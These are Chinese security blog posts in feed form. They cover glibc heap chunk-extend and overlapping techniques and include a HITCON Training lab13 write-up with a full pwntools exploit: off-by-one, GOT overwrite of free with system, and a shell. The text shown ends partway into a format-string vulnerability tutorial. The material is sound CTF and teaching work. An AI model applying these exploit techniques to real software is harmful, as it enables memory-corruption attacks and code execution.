步骤3：把C块也free掉，然后malloc(sizeB+sizeC)，将刚刚被放到bins里面的chunk分配出来,这个时候C这个chunk还是在bins上面的，通过刚刚分配的chunk就可以控制chunk C的fd指针，从而实现任意地址写。</p><h2 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){    void *ptr,*ptr1;    ptr=malloc(0x10);//分配第一个0x10的chunk    malloc(0x10);//分配第二个0x10的chunk    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域    free(ptr);    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">malloc之后堆内存布局0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 20x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk修改chunk1之后0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小0x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000210x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x0000000000020fc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当把chunk 1 size改为0x41(0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小)，chunk 2被chunk 1包含进去，，当把chunk1释放时chunk2被一同释放，再申请一个比chunk1大的块就能直接控制chunk2(不要覆盖top chunk)，称为 overlapping chunk。</p><h2 id="对inuse的smallbin进行extend"><a href="#对inuse的smallbin进行extend" class="headerlink" title="对inuse的smallbin进行extend"></a>对inuse的smallbin进行extend</h2><p>处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。（fastbin 默认的最大的 chunk 可使用范围是 0x70）</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    void *ptr,*ptr1;    ptr=malloc(0x80);//分配第一个 0x80 的chunk1     大小 &gt; fastbin    malloc(0x10); //分配第二个 0x10 的chunk2    malloc(0x10); //防止与top chunk合并    *(int *)((int)ptr-0x8)=0xb1;   // 修改第一个块的size域    free(ptr);    ptr1=malloc(0xa0);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">malloc之后的堆内存布局0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域0x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk0x6020c0:   0x0000000000000000  0x00000000000000000x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk释放后，chunk1 把 chunk2 的内容吞并掉并一起置入unsorted bin0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x00000000000000210x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空0x6020c0:   0x0000000000000000  0x00000000000000000x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以需要额外分配一个 chunk，把释放的块与 top chunk 隔开。释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin，再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时就可以控制 chunk2 中的内容。</p><h2 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h2><p>先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的size域。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    void *ptr,*ptr1;    ptr=malloc(0x80);//分配第一个0x80的chunk1    malloc(0x10);//分配第二个0x10的chunk2    free(ptr);//首先进行释放，使得chunk1进入unsorted bin    *(int *)((int)ptr-0x8)=0xb1;    ptr1=malloc(0xa0);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">malloc之后内存布局0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51释放chunk1使它进入unsorted bin中0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk篡改chunk1的size域0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== size域被篡改0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000090  0x00000000000000200x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h2 id="通过-extend-后向-overlapping"><a href="#通过-extend-后向-overlapping" class="headerlink" title="通过 extend 后向 overlapping"></a>通过 extend 后向 overlapping</h2><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    void *ptr,*ptr1;    ptr=malloc(0x10);//分配第1个 0x80 的chunk1    malloc(0x10); //分配第2个 0x10 的chunk2    malloc(0x10); //分配第3个 0x10 的chunk3    malloc(0x10); //分配第4个 0x10 的chunk4        *(int *)((int)ptr-0x8)=0x61;    free(ptr);    ptr1=malloc(0x50);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>malloc(0x10)申请的都是fastbin。</p><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack</p><h2 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h2><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 </p><p>overlapping</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void){    void *ptr1,*ptr2,*ptr3,*ptr4;    ptr1=malloc(128);//smallbin1    ptr2=malloc(0x10);//fastbin1    ptr3=malloc(0x10);//fastbin2    ptr4=malloc(128);//smallbin2    malloc(0x10);//防止与top合并    free(ptr1);    *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域    *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域    free(ptr4);//unlink进行前向extend    malloc(0x150);//占位块}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>unlink目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并)</p><p>当我们 free(small_chunk) 时</p><p>glibc 判断这个块是 small chunk</p><p>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</p><p>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</p><p>继而对 Nextchunk 采取 unlink 操作</p><p>glibc-2.26及以上这个漏洞不能实现的原因还是因为tcache机制，因为tcache为了速度考虑，所以不进行unlink操作</p><h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">int menu(){  puts("--------------------------------");  puts("          Heap Creator          ");  puts("--------------------------------");  puts(" 1. Create a Heap               ");  puts(" 2. Edit a Heap                 ");  puts(" 3. Show a Heap                 ");  puts(" 4. Delete a Heap               ");  puts(" 5. Exit                        ");  puts("--------------------------------");  return printf("Your choice :");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在create()中发现当输入size的时候调用atoi()的时候可以输入8个字符串,所以可以改写atoi_got为system_addr。</p><p>show()则是正常的打印内容。</p><p>delete()函数知识正常将chunk放入Bins，然后将指针归零，没有uaf漏洞。</p><h3 id="漏洞点（edit）"><a href="#漏洞点（edit）" class="headerlink" title="漏洞点（edit）"></a>漏洞点（edit）</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( heaparray[v1] )  {    printf("Content of heap : ", &amp;buf);    read_input(*((_QWORD *)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL); //off by one    puts("Done !");  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>向data中写入len_of_data+1长度的数据,这里存在off by one</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，然后 申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>create两个chunk，用chunk0溢出到chunk1 的size位，然后free掉chunk1</p><p>申请一个新的chunk2，使得chunk2落在chunk1size的部分从而修改指针</p><p>改free的got表为system的地址，然后使得chunk0 的内容为/bin/sh，接着free（chunk0）从而getshell</p><p>创建两个大小为0x14的堆块，查看</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x/20gx 0x6032900x603290:   0x0000000000000000  0x0000000000000021  ===&gt;chunk10x6032a0:   0x0000000000000014  0x00000000006032c0  指向0x6032b0:   0x0000000000000000  0x0000000000000021  ===&gt;chunk1数据0x6032c0:   0x6161616161616161  0x6161616161616161  长度0x140x6032d0:   0x0000000061616161  0x0000000000000021  ===&gt;chunk20x6032e0:   0x0000000000000014  0x00000000006033000x6032f0:   0x0000000000000000  0x0000000000000021  ===&gt;chunk2数据0x603300:   0x6262626262626262  0x6262626262626262  长度0x140x603310:   0x0000000062626262  0x0000000000020cf1  ===&gt;top chunk0x603320:   0x0000000000000000  0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时堆中保存的结构是</p><pre class="line-numbers language-none"><code class="language-none">-----------------------------------------chunk1 ========&gt; |  prev_size  |  size  |                 |  len(data)  |  ptr   |                 |  prev_size  |  size  |                 |         data         |-----------------------------------------chunk2 ========&gt; |  prev_size  |  size  |                 |  len(data)  |  ptr   |                 |  prev_size  |  size  |                 |         data         |-----------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果我们数据的长度为0x18，调用edit_heap就可触发off-by-one覆盖下一堆块的prev_size</p><p>一个chunk在被free掉之后存在bins中，其头部含有prev_size和size，但一旦malloc后，这个prev_size就没用了，它只用来记录前一个空闲块的大小。因此如果malloc0x18个字节的话多出8个字节没有对齐，会将这个prev_size也当做data段的部分分配出去，而不是下一个堆了。</p><p>之后利用extend 后向 overlapping+fastbin实现</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./heapcreator'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./heapcreator'</span><span class="token punctuation">)</span>lib<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size of Heap : '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content of heap:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content of heap : '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#leak free addr</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#0</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span><span class="token comment">#1</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#2</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment">#3</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">'\x81'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>size <span class="token operator">=</span> <span class="token string">'\x08'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'d'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span> size <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#1</span> show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content : '</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Done'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">'free_addr = '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#trim free_got</span>system_addr <span class="token operator">=</span> free_addr <span class="token operator">+</span> lib<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">-</span>lib<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'system_addr = '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chunk Extend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>学习C语言的时候都会用到格式化字符串的输入和输出，例如:</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;int main(){    printf("My name is %s.\n","YMM");    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行程序会得到</p><pre class="line-numbers language-none"><code class="language-none">My name is YMM.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>程序中的%s被后面的具体内容替换掉了，这就是格式化输出模式。</p><h2 id="几种常见的说明符"><a href="#几种常见的说明符" class="headerlink" title="几种常见的说明符"></a>几种常见的说明符</h2><p>%d - 十进制 - 输出十进制整数<br>%s - 字符串 - 从内存中读取字符串<br>%x - 十六进制 - 输出十六进制数<br>%c - 字符 - 输出字符<br>%p - 指针 - 指针地址<br>%n - 到目前为止所写的字符数</p><h3 id="关于-n"><a href="#关于-n" class="headerlink" title="关于%n"></a>关于%n</h3><p>这里前几个都是用来打印的，最后一个%n却是一个异类，这家伙的作用是写入到某个内存区域到现在为止写过的字符个数。注意要和%n和n区别开来。</p><p>这个的意思就是将第三个我们的填充物以%s的格式打印出来。</p><p>例如</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"12345%n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>%n前面有5个字符，所以i的值是5,输出的值是12345</p><h2 id="产生漏洞的原理"><a href="#产生漏洞的原理" class="headerlink" title="产生漏洞的原理"></a>产生漏洞的原理</h2><p>printf函数存在几个特性，程序员很容易栽在这几个特性上面，导致这些特性能够轻松的被攻击者利用来对程序进行攻击</p><h3 id="printf函数的参数不固定-任意内存读取"><a href="#printf函数的参数不固定-任意内存读取" class="headerlink" title="printf函数的参数不固定(任意内存读取)"></a>printf函数的参数不固定(任意内存读取)</h3><p>先写一个正常的程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Thriumph"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %d %d %d"</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译运行得到<br>Thriumph 1 2 3</p><p>显然，这个结果是正确的，如果printf参数数量不匹配呢？<br>将程序改一下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Thriumph"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %d %d %d %x"</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的格式化字符串需要5个参数，但是后面只提供四个参显然这样的写法是错误的</p><p>能通过编译吗？</p><p>首先printf()是一个参数长度可变函数。因此，仅仅看参数数量是看不出问题的。为了查出比匹配，编译器需要了解printf函数的运行机制，然而编译器通常不做这一类的分析。有的时候，格式化字符串并不是一个常量字符串，他是运行期间用户产生，比如用户输入，所以编译器不能发现是不匹配！所以是可以正常编译的</p><p>printf函数能自身检测到不匹配吗？</p><p>printf函数从栈上取得参数，如果格式字符串需要3个参数，它会从栈上取3个，除非栈被标记了边界，printf并不知道自己是否会用完提供的所有参数。既然没有那样的边界标记。printf会持续从栈上抓取数据，在一个参数数量不匹配的例子中，它会抓取到一些不属于该函数调用到的数据。如果特意准备数据让printf抓取会发生什么呢？</p><p>改动后的代码编译运行的结果是</p><p>Thriuph 1 2 3 6763e359</p><p>6763e359是什么呢，画一张图</p><p><img src="/2020/03/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20250921185658405.png"></p><p>只要能够控制format，就能一直读取能存数据，这就实现了任意内存的读取。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>读入一个字符串并输出</p><p>正确的写法：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;int main(){    char str[100];    scanf("%s",str);    printf("%s",str);    return 0;}<span 